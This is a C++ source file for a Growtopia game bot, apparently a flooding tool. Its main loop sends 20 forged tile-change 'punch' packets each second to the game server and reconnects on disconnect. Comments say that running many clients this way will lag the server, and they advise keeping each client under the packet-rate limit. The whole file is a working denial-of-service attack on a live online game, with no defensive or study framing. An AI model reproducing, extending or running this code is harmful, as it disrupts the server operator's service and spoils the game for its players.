#pragma once
#include <sstream>
#include <vector>
#include <limits>
#include <math.h>
#include <string>
#include <iostream>
#include <regex>
#include <iterator>
#include <algorithm>

#include "corefunc.h"
#include "userfunc.h"
#include <enet/enet.h>

using namespace std;

void GrowtopiaBot::WhenConnected()
{
	connected = true;
	cout << "Connected" << endl;
}

void GrowtopiaBot::WhenDisconnected()
{
	connected = false;
	connectClient();
	
}

#include <chrono>
using namespace std::chrono;

void GrowtopiaBot::userLoop() {

	gameupdatepacket_t packet;
	packet.m_type = PACKET_TILE_CHANGE_REQUEST; // packet tile change lag af
	packet.m_int_data = 18; // punch
	//maybe not much effect cuz limit, but imagine 100 client, each sending 20 packets - 1000/1500 or more packet per second will lag the server
	//you can play with counts ofc, depends on your CPU

	if (lastreq + 1000 < (duration_cast<milliseconds>(system_clock::now().time_since_epoch())).count()) { //execute only once in a second
		lastreq = (duration_cast<milliseconds>(system_clock::now().time_since_epoch())).count();
		
		for (int i = 0; i < 20; i++) { // shouldn't be more than 85 because of pps limit.
			if (!connected) return;
			//SendPacket(2, "action|respawn\n", peer); // well it can be respawn but not that much effect
			int x = i % 100, y = i / 100; 
			packet.m_state1 = x;
			packet.m_state2 = y;
			SendPacket2(NET_MESSAGE_GAME_PACKET, (uint8_t*)&packet, sizeof(gameupdatepacket_t));
			cout << "Sent 1 stack of gameupdatepacket_t type PACKET_TILE_CHANGE_REQUEST" << endl;
		}
		
	}
	return;
}

void GrowtopiaBot::userInit() {
	connectClient();
}
